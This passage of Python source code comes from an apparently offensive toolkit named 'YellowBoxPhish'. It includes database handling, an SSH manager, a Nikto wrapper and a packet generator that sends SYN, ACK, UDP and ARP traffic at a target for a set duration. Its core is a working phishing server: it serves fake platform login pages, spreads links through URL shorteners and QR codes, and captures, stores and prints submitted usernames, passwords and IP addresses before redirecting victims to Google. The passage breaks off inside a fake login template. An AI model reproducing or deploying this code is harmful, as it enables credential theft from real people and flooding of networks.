            self.cursor.execute('SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_links 
                (id, platform, phishing_url, custom_html, created_at, clicks, qr_path, short_url)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.phishing_url, link.custom_html, 
                  link.created_at, link.clicks, link.qr_path, link.short_url))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC')
            else:
                self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional: str = ""):
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional))
            self.conn.commit()
            logger.info(f"Credentials captured for {link_id} from {ip_address}")
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name', (platform,))
            else:
                self.cursor.execute('SELECT * FROM phishing_templates ORDER BY platform, name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def save_phishing_template(self, name: str, platform: str, html_content: str) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_templates (name, platform, html_content)
                VALUES (?, ?, ?)
            ''', (name, platform, html_content))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing template: {e}")
            return False
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes)
                VALUES (?, ?, ?)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        try:
            self.cursor.execute('DELETE FROM managed_ips WHERE ip_address = ?', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                self.cursor.execute('SELECT * FROM managed_ips ORDER BY added_date DESC')
            else:
                self.cursor.execute('SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM managed_ips WHERE ip_address = ?', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def authorize_user(self, platform: str, user_id: str, username: str = None) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO authorized_users (platform, user_id, username, authorized)
                VALUES (?, ?, ?, 1)
            ''', (platform, user_id, username))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to authorize user: {e}")
            return False
    
    def is_user_authorized(self, platform: str, user_id: str) -> bool:
        try:
            self.cursor.execute('''
                SELECT authorized FROM authorized_users 
                WHERE platform = ? AND user_id = ? AND authorized = 1
            ''', (platform, user_id))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check user authorization: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['total_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM platform_messages')
            stats['total_platform_messages'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 60) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Command timed out after {timeout}s', 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['ping', '-n', str(count), target])
        else:
            return NetworkTools.execute_command(['ping', '-c', str(count), target])
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['tracert', '-d', target])
        else:
            return NetworkTools.execute_command(['traceroute', '-n', target])
    
    @staticmethod
    def nmap_scan(target: str, ports: str = "1-1000") -> Dict:
        try:
            cmd = ['nmap', '-T4', '-F', target] if ports == "1-1000" else ['nmap', '-p', ports, target]
            return NetworkTools.execute_command(cmd, timeout=300)
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> Dict:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available'}
        try:
            result = whois.whois(target)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 'isp': data.get('isp')}
            return {'success': False, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def shorten_url(url: str) -> str:
        if not SHORTENER_AVAILABLE:
            return url
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        if not QRCODE_AVAILABLE:
            return False
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except:
            return False
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=YellowBox_Block_{ip}', 'dir=in', 'action=block', f'remoteip={ip}'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=YellowBox_Block_{ip}'], timeout=10)
                return True
            return False
        except:
            return False

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        try:
            server_id = str(uuid.uuid4())[:8]
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {'success': True, 'server_id': server_id, 'message': f'Server {name} added successfully'}
            return {'success': False, 'error': 'Failed to add server to database'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def connect(self, server_id: str) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                connect_kwargs = {'hostname': server['host'], 'port': server['port'],
                                 'username': server['username'], 'timeout': server.get('timeout', self.default_timeout)}
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                self.connections[server_id] = client
                self.db.update_ssh_server_status(server_id, 'connected')
                return {'success': True, 'message': f'Connected to {server["name"]} ({server["host"]})'}
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    try:
                        self.connections[server_id].close()
                    except:
                        pass
                    del self.connections[server_id]
                    self.db.update_ssh_server_status(server_id, 'disconnected')
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> Dict:
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {
                    'success': False, 
                    'output': '', 
                    'error': connect_result.get('error', 'Connection failed'),
                    'execution_time': time.time() - start_time
                }
        
        client = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout or self.default_timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            execution_time = time.time() - start_time
            
            success = len(error) == 0
            
            self.db.log_ssh_command(server_id=server_id, command=command, success=success,
                                   output=output, execution_time=execution_time, executed_by=executed_by)
            
            return {
                'success': success,
                'output': output,
                'error': error if error else None,
                'execution_time': execution_time,
                'server': server_name
            }
        except Exception as e:
            self.disconnect(server_id)
            return {
                'success': False, 
                'output': '', 
                'error': str(e),
                'execution_time': time.time() - start_time,
                'server': server_name
            }
    
    def get_servers(self) -> List[Dict]:
        servers = self.db.get_ssh_servers()
        for server in servers:
            server['connected'] = server['id'] in self.connections
        return servers

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = ['tcp_connect', 'http_get', 'http_post', 'https', 'dns']
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend(['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'arp'])
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100, executed_by: str = "system") -> Dict:
        max_duration = self.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum ({max_duration} seconds)")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            if traffic_type in ['http_get', 'http_post']:
                port = 80
            elif traffic_type == 'https':
                port = 443
            elif traffic_type == 'dns':
                port = 53
            elif traffic_type in ['tcp_syn', 'tcp_ack', 'tcp_connect']:
                port = 80
            elif traffic_type == 'udp':
                port = 53
            else:
                port = 0
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(target=self._run_traffic_generator,
                                 args=(generator_id, traffic_type, target_ip, port, duration, 
                                       packet_rate, stop_event, executed_by))
        thread.daemon = True
        thread.start()
        
        self.active_generators[generator_id] = {
            'traffic_type': traffic_type,
            'target_ip': target_ip,
            'port': port,
            'duration': duration,
            'start_time': datetime.datetime.now().isoformat(),
            'status': 'running'
        }
        
        return {
            'generator_id': generator_id,
            'traffic_type': traffic_type,
            'target_ip': target_ip,
            'port': port,
            'duration': duration,
            'status': 'started'
        }
    
    def _run_traffic_generator(self, generator_id: str, traffic_type: str, target_ip: str,
                               port: int, duration: int, packet_rate: int, 
                               stop_event: threading.Event, executed_by: str):
        try:
            start_time = time.time()
            end_time = start_time + duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            generator_func = self._get_generator_function(traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(target_ip, port)
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    time.sleep(0.1)
            
            status = "completed" if not stop_event.is_set() else "stopped"
            
            # Log to database
            self.db.cursor.execute('''
                INSERT INTO traffic_logs (traffic_type, target_ip, duration, packets_sent, status, executed_by)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (traffic_type, target_ip, duration, packets_sent, status, executed_by))
            self.db.conn.commit()
            
        except Exception as e:
            logger.error(f"Traffic generation error: {e}")
        finally:
            if generator_id in self.active_generators:
                self.active_generators[generator_id]['status'] = 'completed'
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        generators = {
            'icmp': self._generate_icmp,
            'tcp_syn': self._generate_tcp_syn,
            'tcp_ack': self._generate_tcp_ack,
            'tcp_connect': self._generate_tcp_connect,
            'udp': self._generate_udp,
            'http_get': self._generate_http_get,
            'http_post': self._generate_http_post,
            'https': self._generate_https,
            'dns': self._generate_dns,
            'arp': self._generate_arp
        }
        return generators.get(traffic_type, self._generate_tcp_connect)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, ICMP, send
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: YellowBoxPhish\r\n\r\n"
            sock.send(data.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, UDP, send
                data = b"YellowBoxPhish Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"YellowBoxPhish Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "YellowBoxPhish"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=yellowboxphish"
            headers = {"User-Agent": "YellowBoxPhish", "Content-Length": str(len(data))}
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "YellowBoxPhish"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import Ether, ARP, sendp
            local_mac = self._get_local_mac()
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id,
                "target_ip": generator.get('target_ip', ''),
                "traffic_type": generator.get('traffic_type', ''),
                "duration": generator.get('duration', 0),
                "status": generator.get('status', '')
            })
        return active

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            cmd = ['nikto', '-host', target]
            if options.get('ssl') or target.startswith('https://'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-Tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 300))
            scan_time = time.time() - start_time
            vulnerabilities = self._parse_output(result.stdout)
            
            # Save to database
            self.db.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, json.dumps(vulnerabilities), f"nikto_{int(time.time())}.txt", scan_time, result.returncode == 0))
            self.db.conn.commit()
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout', 'target': target}
        except Exception as e:
            return {'success': False, 'error': str(e), 'target': target}
    
    def _parse_output(self, output: str) -> List[Dict]:
        vulnerabilities = []
        for line in output.split('\n'):
            if '+ ' in line or 'OSVDB' in line or 'CVE' in line:
                vulnerabilities.append({'description': line.strip(), 'severity': Severity.MEDIUM})
        return vulnerabilities

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_phishing_page()
        elif self.path.startswith('/capture'):
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        elif self.path == '/qr':
            self.send_qr_code()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.YELLOW}📧 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"{Colors.GREEN}  IP: {client_ip}{Colors.RESET}")
                print(f"{Colors.GREEN}  Username: {username}{Colors.RESET}")
                print(f"{Colors.GREEN}  Password: {password}{Colors.RESET}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)
    
    def send_qr_code(self):
        if self.server_instance and self.server_instance.qr_path and os.path.exists(self.server_instance.qr_path):
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.end_headers()
            with open(self.server_instance.qr_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
        self.qr_path = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080, qr_path: str = None) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            self.qr_path = qr_path
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{NetworkTools.get_local_ip()}:8080"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None, custom_html: str = None) -> Dict:
        try:
            link_id = str(uuid.uuid4())[:8]
            
            if custom_html:
                html_file = os.path.join(CUSTOM_PHISHING_DIR, f"{link_id}.html")
                with open(html_file, 'w') as f:
                    f.write(custom_html)
                html_content = custom_html
            else:
                templates = self.db.get_phishing_templates(platform)
                if templates:
                    html_content = templates[0].get('html_content', '')
                else:
                    html_content = self._get_default_template(platform)
            
            # Generate QR code
            qr_path = None
            if QRCODE_AVAILABLE:
                try:
                    qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
                    url = f"http://{NetworkTools.get_local_ip()}:8080"
                    if NetworkTools.generate_qr_code(url, qr_filename):
                        qr_path = qr_filename
                except Exception as e:
                    logger.error(f"QR generation failed: {e}")
            
            # Shorten URL
            short_url = None
            if SHORTENER_AVAILABLE:
                try:
                    short_url = NetworkTools.shorten_url(f"http://{NetworkTools.get_local_ip()}:8080")
                except Exception as e:
                    logger.error(f"URL shortening failed: {e}")
            
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080",
                template=platform,
                created_at=datetime.datetime.now().isoformat(),
                custom_html=custom_html,
                qr_path=qr_path,
                short_url=short_url
            )
            
            self.db.save_phishing_link(phishing_link)
            self.active_links[link_id] = {
                'platform': platform, 
                'html': html_content, 
                'custom_html': custom_html,
                'qr_path': qr_path,
                'short_url': short_url
            }
            
            return {
                'success': True, 
                'link_id': link_id, 
                'platform': platform, 
                'phishing_url': phishing_link.phishing_url,
                'qr_path': qr_path,
                'short_url': short_url
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_default_template(self, platform: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{platform} Login</title>
<style>
body{{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#FFD700 0%,#FFA500 100%);margin:0}}
.login-box{{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}}
